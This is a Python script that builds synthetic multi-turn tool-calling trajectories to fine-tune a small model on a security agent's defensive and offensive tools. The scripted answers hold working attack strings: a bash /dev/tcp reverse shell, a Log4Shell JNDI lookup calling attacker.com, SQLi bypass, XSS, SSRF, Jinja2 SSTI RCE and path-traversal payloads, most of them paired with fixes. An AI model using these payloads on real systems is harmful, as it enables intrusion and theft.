#!/usr/bin/env python3
"""
Generates multi-turn ReAct tool-calling trajectories for Fluxnat Coder 3B.
Teaches the model to chain all 13 SmartAGENT defensive & offensive security tools:
- list_files, read_file, search_code, scan_code, get_cwe_info, write_report, run_command, fix_code
- recon, exploit_db, generate_payload, web_attack, post_exploit
"""

import sys
import json
from pathlib import Path
sys.path.insert(0, str(Path(__file__).parent.parent))

from smartagent.agent.tools import ToolRegistry
from smartagent.agent.prompts import (
    AGENT_SYSTEM_PROMPT,
    REACT_OBSERVATION_PREFIX,
    REACT_CONTINUE_PROMPT,
)


def build_react_samples():
    registry = ToolRegistry(working_dir=".")
    sys_prompt = AGENT_SYSTEM_PROMPT.format(
        tool_descriptions=registry.get_tool_descriptions()
    )

    def obs_msg(text: str) -> dict:
        return {
            "role": "user",
            "content": f"{REACT_OBSERVATION_PREFIX}{text}\n\n{REACT_CONTINUE_PROMPT}",
        }

    samples = [
        # 1. Recon + Exploit DB chain (Apache Log4j)
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Scan 192.168.1.50 on ports 80,443,8080 and check if there are known Log4j exploits."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I need to start by performing network reconnaissance on 192.168.1.50 across ports 80, 443, and 8080 using the `recon` tool.\n"
                        "Action: recon\n"
                        "Action Input: 192.168.1.50 80,443,8080"
                    ),
                },
                obs_msg(
                    "### Network Reconnaissance Report: `192.168.1.50`\n"
                    "- **Port 80/tcp:** OPEN (HTTP - nginx/1.18.0)\n"
                    "- **Port 8080/tcp:** OPEN (Apache Tomcat/9.0.50 - Java backend with Log4j2)"
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Port 8080 is running a Java backend with Log4j2. Now I should query `exploit_db` for Log4j vulnerabilities (CVE-2021-44228) to assess the exploitability and impact.\n"
                        "Action: exploit_db\n"
                        "Action Input: CVE-2021-44228"
                    ),
                },
                obs_msg(registry.execute("exploit_db", "CVE-2021-44228")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have both the port scan results on 192.168.1.50 and the full CVE-2021-44228 (Log4Shell) intelligence. I can now provide a comprehensive assessment.\n"
                        "Final Answer: ### Target Assessment: `192.168.1.50`\n\n"
                        "1. **Open Services Discovered:**\n"
                        "   - `80/tcp`: nginx 1.18.0\n"
                        "   - `8080/tcp`: Apache Tomcat 9.0.50 with Log4j2\n\n"
                        "2. **Critical Vulnerability Match — CVE-2021-44228 (Log4Shell):**\n"
                        "   - **CVSS:** 10.0 (Critical) | **CWE:** CWE-502 / CWE-917\n"
                        "   - **Mechanism:** Unauthenticated JNDI lookup injection (`${jndi:ldap://attacker.com/a}`) in HTTP headers or parameters logged by Log4j2 (< 2.15.0) triggers remote class loading and arbitrary code execution.\n\n"
                        "3. **Remediation:**\n"
                        "   - Upgrade Log4j2 to **>= 2.17.1** immediately.\n"
                        "   - Set `-Dlog4j2.formatMsgNoLookups=true` and remove `JndiLookup.class` from the classpath."
                    ),
                },
            ]
        },
        # 2. Codebase discovery -> scan_code -> fix_code
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Audit this project for SQL injection vulnerabilities and generate a secure fix."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Let's search across the codebase for raw SQL queries (`SELECT` or `execute`) using `search_code`.\n"
                        "Action: search_code\n"
                        "Action Input: SELECT .* FROM"
                    ),
                },
                obs_msg(
                    "Found 2 matches for 'SELECT .* FROM':\n"
                    "  auth_service.py:24: query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n"
                    "  reports.py:18: cursor.execute(\"SELECT id, title FROM reports WHERE owner_id = %s\", (uid,))"
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: `auth_service.py:24` uses an f-string to interpolate `username` and `password` directly into a SQL query, whereas `reports.py:18` uses safe parameterized `%s` binding. Let me run `scan_code` on `auth_service.py` to confirm all findings.\n"
                        "Action: scan_code\n"
                        "Action Input: auth_service.py"
                    ),
                },
                obs_msg(
                    "Found 1 findings in auth_service.py:\n\n"
                    "  [CRITICAL] SQL Injection (String Formatting)\n"
                    "    CWE: CWE-89 | CVSS: 9.8 | Line: 24\n"
                    "    Code: query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n"
                    "    Fix: Use parameterized queries (`cursor.execute(sql, params)`)."
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now I will call `fix_code` for CWE-89 on the vulnerable snippet to provide a drop-in remediation template.\n"
                        "Action: fix_code\n"
                        "Action Input: CWE-89|||query = f\"SELECT * FROM users WHERE username = '{username}'\"\ncursor.execute(query)"
                    ),
                },
                obs_msg(registry.execute("fix_code", "CWE-89|||query = f\"SELECT * FROM users WHERE username = '{username}'\"\ncursor.execute(query)")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have identified the SQL injection vulnerability in `auth_service.py`, verified that `reports.py` is safe, and generated the parameterized replacement.\n"
                        "Final Answer: ### SQL Injection Audit Report\n\n"
                        "- **Vulnerable File:** `auth_service.py` (Line 24)\n"
                        "- **CWE:** CWE-89 (SQL Injection) | **Severity:** Critical (CVSS 9.8)\n"
                        "- **Safe File:** `reports.py` (Line 18 uses parameterized `%s` tuple binding and is not vulnerable).\n\n"
                        "#### Secure Fix for `auth_service.py`:\n"
                        "```python\n"
                        "cursor.execute(\n"
                        "    \"SELECT * FROM users WHERE username = %s AND password_hash = %s\",\n"
                        "    (username, password_hash)\n"
                        ")\n"
                        "```"
                    ),
                },
            ]
        },
        # 3. Payload generation for SQLi Auth Bypass
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Generate SQL injection authentication bypass test payloads and explain how to patch the login endpoint."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will use the `generate_payload` tool with `sqli auth_bypass` to retrieve standard authentication bypass test vectors and remediation guidance.\n"
                        "Action: generate_payload\n"
                        "Action Input: sqli auth_bypass"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "sqli auth_bypass")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have the SQLi authentication bypass vectors and remediation details. I will present them clearly.\n"
                        "Final Answer: ### SQL Injection Authentication Bypass Vectors (CWE-89)\n\n"
                        "#### Test Payloads:\n"
                        "1. `' OR '1'='1' --`\n"
                        "2. `' OR 1=1#`\n"
                        "3. `admin'--`\n"
                        "4. `' UNION SELECT 1, 'admin', 'hashed_pw' --`\n\n"
                        "#### Root Cause:\n"
                        "When user input is concatenated directly into `SELECT * FROM users WHERE user = '...' AND pass = '...'`, injecting `' OR '1'='1' --` makes the `WHERE` clause evaluate to `TRUE` and comments out the password check.\n\n"
                        "#### Remediation:\n"
                        "Use prepared statements / parameterized queries (`cursor.execute(\"SELECT * FROM users WHERE user = ?\", (user,))`) so input is strictly treated as a bound literal."
                    ),
                },
            ]
        },
        # 4. Web attack surface audit (headers + endpoints)
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Audit http://127.0.0.1:8000 for exposed sensitive files and missing HTTP security headers."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I should use the `web_attack` tool in `all` mode against `http://127.0.0.1:8000` to check both HTTP security headers and exposed sensitive paths.\n"
                        "Action: web_attack\n"
                        "Action Input: http://127.0.0.1:8000 all"
                    ),
                },
                obs_msg(
                    "### Web Attack Surface Assessment: `http://127.0.0.1:8000` (Mode: `all`)\n\n"
                    "#### 1. HTTP Security Headers Audit:\n"
                    "- [MISSING] `Content-Security-Policy` (Mitigates XSS & data injection - CWE-79)\n"
                    "- [MISSING] `Strict-Transport-Security` (Enforces HTTPS connections - CWE-319)\n"
                    "- [MISSING] `X-Frame-Options` (Prevents Clickjacking - CWE-1021)\n"
                    "- [EXPOSED] `Server: Werkzeug/3.0.1 Python/3.12` (Information disclosure - CWE-200)\n\n"
                    "#### 2. Sensitive Endpoint Discovery:\n"
                    "- `[200 OK]` `/.env` (412 bytes) — CRITICAL: Exposed environment secrets (CWE-200 / CWE-538)\n"
                    "- `[200 OK]` `/swagger.json` (3,810 bytes) — Exposed API specification"
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: The `web_attack` scan revealed a critical `.env` exposure, exposed `/swagger.json`, server version banner leakage, and missing CSP/HSTS/X-Frame-Options headers. I can now compile the final report.\n"
                        "Final Answer: ### Web Attack Surface Findings (`http://127.0.0.1:8000`)\n\n"
                        "1. **[CRITICAL] Exposed `.env` Configuration (`/.env` — HTTP 200):**\n"
                        "   - **CWE:** CWE-200 / CWE-538 | **CVSS:** 9.1\n"
                        "   - **Fix:** Block dotfile access at the reverse proxy (`location ~ /\\. { deny all; }`) and move `.env` outside the web root.\n\n"
                        "2. **[MEDIUM] Missing Security Headers (CWE-693 / CWE-1021):**\n"
                        "   - Add `Content-Security-Policy: default-src 'self'`, `Strict-Transport-Security: max-age=63072000; includeSubDomains`, `X-Content-Type-Options: nosniff`, and `X-Frame-Options: DENY`.\n\n"
                        "3. **[LOW] Server Banner Disclosure (CWE-200):**\n"
                        "   - Suppress the `Server: Werkzeug/...` header in production and run behind Gunicorn/Nginx."
                    ),
                },
            ]
        },
        # 5. Post-exploitation Linux Privesc
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "We obtained a low-privilege shell on a Linux target during an authorized pentest. What privilege escalation vectors should we check?"},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will use the `post_exploit` tool with `linux privesc` to generate the Linux privilege escalation audit and enumeration checklist.\n"
                        "Action: post_exploit\n"
                        "Action Input: linux privesc"
                    ),
                },
                obs_msg(registry.execute("post_exploit", "linux privesc")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: The `post_exploit` tool returned the full Linux privilege escalation audit covering SUID/SGID binaries, sudo rules, cron jobs, Linux capabilities, and writable sensitive files.\n"
                        "Final Answer: ### Linux Privilege Escalation Enumeration Checklist (MITRE T1068 / T1548)\n\n"
                        "1. **Sudo Privileges (`sudo -l`):**\n"
                        "   - Check for `NOPASSWD` entries, `LD_PRELOAD` preservation, or GTFOBins-exploitable binaries.\n"
                        "2. **SUID / SGID Binaries (`find / -perm -4000 -type f 2>/dev/null`):**\n"
                        "   - Audit custom SUID binaries or standard binaries (`python`, `vim`, `find`, `bash`, `cp`) with root SUID bits.\n"
                        "3. **Linux Capabilities (`getcap -r / 2>/dev/null`):**\n"
                        "   - Look for `cap_setuid+ep` or `cap_dac_read_search+ep` on interpreters.\n"
                        "4. **Cron Jobs (`cat /etc/crontab /etc/cron.*/*`):**\n"
                        "   - Identify root-scheduled scripts located in world-writable directories or using relative `PATH` entries.\n"
                        "5. **Writable `/etc/passwd` or `/etc/sudoers`:**\n"
                        "   - Verify permissions with `ls -la /etc/passwd /etc/shadow /etc/sudoers`."
                    ),
                },
            ]
        },
        # 6. Post-exploitation Active Directory
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Audit Active Directory lateral movement and Kerberoasting attack paths."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will invoke `post_exploit` with `ad` to retrieve Active Directory post-exploitation, Kerberoasting, AS-REP Roasting, and lateral movement analysis.\n"
                        "Action: post_exploit\n"
                        "Action Input: ad"
                    ),
                },
                obs_msg(registry.execute("post_exploit", "ad")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have the Active Directory attack path and detection details from `post_exploit`.\n"
                        "Final Answer: ### Active Directory Lateral Movement & Credential Audit\n\n"
                        "1. **Kerberoasting (MITRE T1558.003):**\n"
                        "   - Any domain user can request a TGS ticket (`Event ID 4769`) for accounts with SPNs. If RC4 (`0x17`) is enabled, the service account password hash can be cracked offline.\n"
                        "   - **Fix:** Enforce AES-256 Kerberos encryption and use Group Managed Service Accounts (gMSA) with 25+ char passwords.\n\n"
                        "2. **AS-REP Roasting (MITRE T1558.004):**\n"
                        "   - Targets accounts with `UF_DONT_REQUIRE_PREAUTH` enabled.\n"
                        "   - **Fix:** Require Kerberos pre-authentication across all domain users.\n\n"
                        "3. **Pass-the-Hash / Pass-the-Ticket (MITRE T1550):**\n"
                        "   - Prevent lateral movement by enabling Credential Guard, restricting local administrator reuse via LAPS, and adding privileged accounts to the `Protected Users` security group."
                    ),
                },
            ]
        },
        # 7. Reverse shell payload generation & defense
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Generate a bash reverse shell test command for 10.10.14.8:4444 and explain how defenders detect it."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will call `generate_payload` with `revshell 10.10.14.8:4444 bash`.\n"
                        "Action: generate_payload\n"
                        "Action Input: revshell 10.10.14.8:4444 bash"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "revshell 10.10.14.8:4444 bash")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have the reverse shell syntax and defensive monitoring controls.\n"
                        "Final Answer: ### Reverse Shell Test Vector & Defensive Detection\n\n"
                        "#### Bash `/dev/tcp` Payload:\n"
                        "```bash\n"
                        "bash -i >& /dev/tcp/10.10.14.8/4444 0>&1\n"
                        "```\n\n"
                        "#### Defensive Detection & Hardening:\n"
                        "1. **Egress Filtering:** Block unauthorized outbound TCP connections from web/application servers at the perimeter firewall.\n"
                        "2. **EDR / Auditd Rules:** Alert on web server processes (`www-data`, `nginx`, `node`, `java`) spawning interactive shells (`/bin/bash -i`, `/bin/sh -i`) with file descriptors bound to network sockets."
                    ),
                },
            ]
        },
        # 8. Exploit DB + CWE lookup chain
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Look up EternalBlue in the exploit database and check the CWE details for buffer overflows."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: First, I'll query `exploit_db` for `CVE-2017-0144` (EternalBlue).\n"
                        "Action: exploit_db\n"
                        "Action Input: CVE-2017-0144"
                    ),
                },
                obs_msg(registry.execute("exploit_db", "CVE-2017-0144")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now I will look up CWE-120 / CWE-787 in `get_cwe_info` to provide full CWE remediation context.\n"
                        "Action: get_cwe_info\n"
                        "Action Input: CWE-787"
                    ),
                },
                obs_msg(registry.execute("get_cwe_info", "CWE-787")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have both the CVE-2017-0144 EternalBlue intelligence and CWE-787 Out-of-bounds Write details.\n"
                        "Final Answer: ### EternalBlue (CVE-2017-0144) & Out-of-Bounds Write Analysis\n\n"
                        "- **CVE:** CVE-2017-0144 (MS17-010 EternalBlue)\n"
                        "- **CVSS:** 9.8 (Critical) | **Service:** Microsoft Windows SMBv1 (`srv.sys` port 445)\n"
                        "- **Root Cause:** Integer overflow in SMBv1 `SrvOs2FeaListSizeToNt` calculation leads to a kernel pool buffer overflow (CWE-787: Out-of-bounds Write), allowing unauthenticated remote kernel code execution.\n"
                        "- **Remediation:** Apply MS17-010 security patch, disable SMBv1 (`Set-SmbServerConfiguration -EnableSMB1Protocol $false`), and block TCP port 445 at network boundaries."
                    ),
                },
            ]
        },
        # 9. Multi-step file reading + XSS detection + payload verification
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Check `views.py` for XSS vulnerabilities and show what payload would trigger it."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: First, I should read `views.py` using `read_file` to inspect how user input is rendered.\n"
                        "Action: read_file\n"
                        "Action Input: views.py"
                    ),
                },
                obs_msg(
                    "File: views.py (18 lines)\n"
                    "1: from flask import Flask, request, make_response\n"
                    "2: app = Flask(__name__)\n"
                    "3:\n"
                    "4: @app.route('/search')\n"
                    "5: def search():\n"
                    "6:     q = request.args.get('q', '')\n"
                    "7:     html = f'<h2>Results for: {q}</h2>'\n"
                    "8:     return make_response(html)"
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Line 7 of `views.py` directly embeds unescaped `q` into an HTML string (`<h2>Results for: {q}</h2>`), creating a Reflected XSS vulnerability (CWE-79). Let me generate standard reflected XSS verification payloads using `generate_payload`.\n"
                        "Action: generate_payload\n"
                        "Action Input: xss reflected"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "xss reflected")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have confirmed the Reflected XSS on line 7 of `views.py` and generated verification payloads.\n"
                        "Final Answer: ### Reflected XSS in `views.py` (Line 7)\n\n"
                        "- **Vulnerability:** Reflected Cross-Site Scripting (CWE-79)\n"
                        "- **Severity:** High (CVSS 7.2) | **OWASP:** A03:2021 - Injection\n"
                        "- **Taint Flow:** `request.args.get('q')` (Source) $\\rightarrow$ unescaped f-string HTML (Sink).\n\n"
                        "#### Proof-of-Concept Payload:\n"
                        "`/search?q=<script>alert(document.domain)</script>` or `/search?q=<img src=x onerror=alert(1)>`\n\n"
                        "#### Secure Remediation:\n"
                        "```python\n"
                        "from markupsafe import escape\n\n"
                        "@app.route('/search')\n"
                        "def search():\n"
                        "    q = escape(request.args.get('q', ''))\n"
                        "    return make_response(f'<h2>Results for: {q}</h2>')\n"
                        "```"
                    ),
                },
            ]
        },
        # 10. SSRF Payload + Code Audit
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Generate SSRF test vectors targeting AWS cloud metadata and explain how to block SSRF in Python."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will call `generate_payload` with `ssrf cloud_metadata` to get SSRF test vectors for cloud metadata endpoints.\n"
                        "Action: generate_payload\n"
                        "Action Input: ssrf cloud_metadata"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "ssrf cloud_metadata")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have the SSRF cloud metadata payloads and remediation controls.\n"
                        "Final Answer: ### Server-Side Request Forgery (SSRF — CWE-918) Cloud Metadata Vectors\n\n"
                        "#### Test Vectors:\n"
                        "- **AWS IMDSv1:** `http://169.254.169.254/latest/meta-data/iam/security-credentials/`\n"
                        "- **GCP Metadata:** `http://metadata.google.internal/computeMetadata/v1/`\n"
                        "- **IPv6 / Decimal Bypass:** `http://[::ffff:169.254.169.254]/` or `http://2852039166/`\n\n"
                        "#### Python Remediation:\n"
                        "1. Enforce IMDSv2 (`HttpTokens=required` on EC2).\n"
                        "2. Parse the URL with `urllib.parse.urlparse`, enforce an allowlist of domains, resolve the hostname via `socket.getaddrinfo()`, and reject any private/loopback/link-local IP (`ip.is_private`, `ip.is_loopback`, `ip.is_link_local`) before making the HTTP request with `allow_redirects=False`."
                    ),
                },
            ]
        },
        # 11. Windows Persistence Post-Exploitation
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "What Windows persistence mechanisms should we audit during an incident response engagement?"},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will run `post_exploit` with `windows persistence` to list key Windows persistence locations and registry keys.\n"
                        "Action: post_exploit\n"
                        "Action Input: windows persistence"
                    ),
                },
                obs_msg(registry.execute("post_exploit", "windows persistence")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have the Windows persistence checklist.\n"
                        "Final Answer: ### Windows Persistence Audit Checklist (MITRE T1547 / T1053)\n\n"
                        "1. **Registry Run / RunOnce Keys:**\n"
                        "   - `reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n"
                        "   - `reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n"
                        "2. **Scheduled Tasks:**\n"
                        "   - `schtasks /query /fo LIST /v`\n"
                        "3. **Windows Services & WMI Event Subscriptions:**\n"
                        "   - Check `HKLM\\SYSTEM\\CurrentControlSet\\Services` for unsigned binaries or `cmd.exe` / `powershell.exe` service paths.\n"
                        "4. **Image File Execution Options (IFEO) / Sticky Keys (`sethc.exe`):**\n"
                        "   - `reg query \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\"`"
                    ),
                },
            ]
        },
        # 12. SSTI Payload Generation
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Generate Server-Side Template Injection (SSTI) payloads for Jinja2 and explain how to fix it."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Let's call `generate_payload` with `ssti jinja2` to get Jinja2 SSTI detection and exploitation probes.\n"
                        "Action: generate_payload\n"
                        "Action Input: ssti jinja2"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "ssti jinja2")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have the SSTI probes and remediation steps.\n"
                        "Final Answer: ### Jinja2 Server-Side Template Injection (CWE-1336 / CWE-94)\n\n"
                        "#### Detection & Verification Probes:\n"
                        "- **Math Evaluation Probe:** `{{7*7}}` (renders `49` if vulnerable)\n"
                        "- **Config Disclosure:** `{{config.items()}}`\n"
                        "- **RCE Gadget Chain:** `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}`\n\n"
                        "#### Secure Fix:\n"
                        "Never pass user input into `Template(user_input).render()` or `render_template_string(f'Hello {user}')`. Pass untrusted data exclusively as named context variables (`render_template('index.html', username=user)`) or use `jinja2.sandbox.SandboxedEnvironment`."
                    ),
                },
            ]
        },
        # 13. LFI / Path Traversal Payload + CWE-22 Fix
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Generate LFI / Path Traversal payloads and show how to remediate CWE-22 in Python."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will first call `generate_payload` with `lfi` to get path traversal test vectors.\n"
                        "Action: generate_payload\n"
                        "Action Input: lfi"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "lfi")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now I will call `fix_code` for CWE-22 to show the canonicalized path verification pattern.\n"
                        "Action: fix_code\n"
                        "Action Input: CWE-22|||open('/var/www/uploads/' + filename).read()"
                    ),
                },
                obs_msg(registry.execute("fix_code", "CWE-22|||open('/var/www/uploads/' + filename).read()")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have both the LFI payloads and the canonical path boundary check remediation.\n"
                        "Final Answer: ### Local File Inclusion / Path Traversal (CWE-22)\n\n"
                        "#### Test Payloads:\n"
                        "- `../../../../etc/passwd`\n"
                        "- `..%2f..%2f..%2f..%2fetc%2fpasswd`\n"
                        "- `....//....//....//etc/passwd`\n\n"
                        "#### Secure Python Remediation:\n"
                        "```python\n"
                        "import os\n\n"
                        "BASE_DIR = os.path.realpath('/var/www/uploads')\n"
                        "target_path = os.path.realpath(os.path.join(BASE_DIR, os.path.basename(filename)))\n"
                        "if not target_path.startswith(BASE_DIR + os.sep):\n"
                        "    raise PermissionError('Path traversal blocked')\n"
                        "with open(target_path, 'rb') as f:\n"
                        "    data = f.read()\n"
                        "```"
                    ),
                },
            ]
        },
        # 14. Command Injection Payload + Fix
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Generate OS command injection test payloads and provide a secure Python subprocess fix."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I will call `generate_payload` with `cmdi` to retrieve command injection test payloads.\n"
                        "Action: generate_payload\n"
                        "Action Input: cmdi"
                    ),
                },
                obs_msg(registry.execute("generate_payload", "cmdi")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now let's get the CWE-78 secure remediation template from `fix_code`.\n"
                        "Action: fix_code\n"
                        "Action Input: CWE-78|||os.system(f'ping -c 1 {host}')"
                    ),
                },
                obs_msg(registry.execute("fix_code", "CWE-78|||os.system(f'ping -c 1 {host}')")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have both the command injection vectors and the `subprocess.run(..., shell=False)` remediation.\n"
                        "Final Answer: ### OS Command Injection (CWE-78) Payloads & Fix\n\n"
                        "#### Verification Payloads:\n"
                        "- `127.0.0.1; id`\n"
                        "- `127.0.0.1 && whoami`\n"
                        "- `127.0.0.1 | cat /etc/passwd`\n"
                        "- `` `id` `` or `$(id)`\n\n"
                        "#### Secure Python Fix:\n"
                        "```python\n"
                        "import subprocess\n"
                        "import ipaddress\n\n"
                        "# Validate input and pass arguments as a list with shell=False\n"
                        "ipaddress.ip_address(host)\n"
                        "res = subprocess.run(['ping', '-c', '1', host], shell=False, capture_output=True, text=True, timeout=5)\n"
                        "```"
                    ),
                },
            ]
        },
        # 15. List files -> Scan code -> Write report
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "List the files in the current workspace, scan `app.py`, and export a markdown vulnerability report."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: First, I will list all code files in the current directory using `list_files`.\n"
                        "Action: list_files\n"
                        "Action Input: ."
                    ),
                },
                obs_msg(
                    "Found 3 files in '.':\n"
                    "  app.py  (1420 bytes)\n"
                    "  config.py  (512 bytes)\n"
                    "  Dockerfile  (240 bytes)"
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now I will scan `app.py` for security vulnerabilities using `scan_code`.\n"
                        "Action: scan_code\n"
                        "Action Input: app.py"
                    ),
                },
                obs_msg(
                    "Found 2 findings in app.py:\n\n"
                    "  [CRITICAL] Hardcoded AWS Access Key ID\n"
                    "    CWE: CWE-798 | CVSS: 9.8 | Line: 8\n"
                    "    Code: AWS_KEY = \"AKIAIOSFODNN7EXAMPLE\"\n"
                    "    Fix: Move secrets to environment variables.\n\n"
                    "  [CRITICAL] OS Command Injection\n"
                    "    CWE: CWE-78 | CVSS: 9.8 | Line: 29\n"
                    "    Code: os.system(f\"tar -czf /tmp/{archive_name} /var/log/app\")\n"
                    "    Fix: Use subprocess.run with an argument list and shell=False."
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now I will export the accumulated findings to a Markdown report using `write_report`.\n"
                        "Action: write_report\n"
                        "Action Input: markdown"
                    ),
                },
                obs_msg("Report written to smartagent_report.md (2 findings)."),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: The scan and report export are complete. I can now summarize the findings for the user.\n"
                        "Final Answer: ### Workspace Security Audit Complete\n\n"
                        "- **Scanned File:** `app.py`\n"
                        "- **Findings Identified:** 2 Critical vulnerabilities\n"
                        "  1. **CWE-798 (Hardcoded AWS Key)** on Line 8 (CVSS 9.8)\n"
                        "  2. **CWE-78 (OS Command Injection)** on Line 29 (CVSS 9.8)\n"
                        "- **Report Saved:** `smartagent_report.md`"
                    ),
                },
            ]
        },
        # 16. Run command (git log / security audit) + Exploit DB
        {
            "messages": [
                {"role": "system", "content": sys_prompt},
                {"role": "user", "content": "Check the recent git commits using `run_command` and look up OpenSSH vulnerabilities in `exploit_db`."},
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Let's run `git log -n 3 --oneline` using `run_command`.\n"
                        "Action: run_command\n"
                        "Action Input: git log -n 3 --oneline"
                    ),
                },
                obs_msg(
                    "Exit code: 0\n"
                    "02414f7 feat(agent): add red team security tools and update benchmarks for v0.3.0\n"
                    "b36acf2 feat: add automated Colab retraining and deployment script\n"
                    "c2b136e feat: add 170 red team training samples"
                ),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: Now let's query `exploit_db` for `ssh` to inspect known OpenSSH CVEs.\n"
                        "Action: exploit_db\n"
                        "Action Input: ssh"
                    ),
                },
                obs_msg(registry.execute("exploit_db", "ssh")),
                {
                    "role": "assistant",
                    "content": (
                        "Thought: I have both the git commit history and the OpenSSH CVE intelligence (CVE-2024-6387 regreSSHion).\n"
                        "Final Answer: ### Git Commit History & OpenSSH Vulnerability Intelligence\n\n"
                        "#### Recent Commits:\n"
                        "- `02414f7`: feat(agent): add red team security tools and update benchmarks for v0.3.0\n"
                        "- `b36acf2`: feat: add automated Colab retraining and deployment script\n"
                        "- `c2b136e`: feat: add 170 red team training samples\n\n"
                        "#### OpenSSH Advisory — CVE-2024-6387 (`regreSSHion`):\n"
                        "- **CVSS:** 8.1 (High) | **CWE:** CWE-362 (Signal Handler Race Condition)\n"
                        "- **Affected:** OpenSSH `8.5p1 <= version < 9.8p1` on glibc Linux systems.\n"
                        "- **Remediation:** Upgrade OpenSSH to **>= 9.8p1** or set `LoginGraceTime 0` in `sshd_config`."
                    ),
                },
            ]
        },
    ]

    output_path = Path("data/custom_cot/react_tool_cot.jsonl")
    output_path.parent.mkdir(parents=True, exist_ok=True)
    with open(output_path, "w", encoding="utf-8") as f:
        for s in samples:
            f.write(json.dumps(s, ensure_ascii=False) + "\n")

    print(f"[OK] Generated {len(samples)} multi-turn ReAct tool-calling trajectories -> {output_path}")
    return len(samples)


if __name__ == "__main__":
    build_react_samples()
